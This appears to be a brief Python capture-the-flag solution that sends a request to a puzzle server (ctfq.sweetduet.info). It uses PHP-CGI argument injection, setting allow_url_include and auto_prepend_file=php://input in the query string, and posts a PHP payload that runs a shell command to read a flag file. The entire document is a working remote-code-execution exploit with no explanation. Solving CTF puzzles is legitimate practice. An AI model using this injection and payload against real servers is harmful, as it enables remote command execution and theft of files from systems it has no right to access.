import requests

response = requests.post("http://ctfq.sweetduet.info:10080/~q12/index.php?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input",
                         data="<?php system('cat flag_flag_flag.txt'); ?>")
print(response.text)                         
